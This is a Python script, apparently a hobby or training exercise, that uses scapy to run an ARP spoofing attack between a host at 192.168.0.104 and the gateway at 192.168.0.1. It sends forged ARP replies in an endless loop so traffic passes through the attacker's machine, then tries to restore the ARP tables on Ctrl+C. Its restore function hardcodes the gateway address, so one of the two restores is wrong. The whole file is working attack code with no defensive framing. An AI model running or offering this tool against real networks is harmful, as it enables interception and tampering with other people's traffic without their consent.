import scapy.all as scapy
import time

def get_mac_address(ip):
    arp_request = scapy.ARP(pdst = ip);
    broad_request = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff");
    broad_arp_request = broad_request/arp_request;
    arp_request_list = scapy.srp(broad_arp_request ,timeout = 1,verbose = False)[0];
    return arp_request_list[0][1].hwsrc;

def recover_arp(target_ip , spoofed_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc="192.168.0.1",hwsrc = get_mac_address(spoofed_ip));
    scapy.send(packet, verbose=False)




def arp_spoof(target_ip,spoof_ip):
    packet = scapy.ARP(op = 2,pdst = target_ip,hwdst = get_mac_address(target_ip),psrc = spoof_ip);
    scapy.send(packet , verbose = False)


sent_packets_count = 0;
try:
    while True:
        arp_spoof("192.168.0.104" , "192.168.0.1");
        arp_spoof("192.168.0.1" , "192.168.0.104");
        sent_packets_count+=2;
        print("\r[+] packets sent: "+str(sent_packets_count),end = "");
        time.sleep(2);
except KeyboardInterrupt:
    print("[+] Detected CTRL + C .......... Quitting.")
    recover_arp("192.168.0.1","192.168.0.104")
    recover_arp("192.168.0.104" , "192.168.0.1")

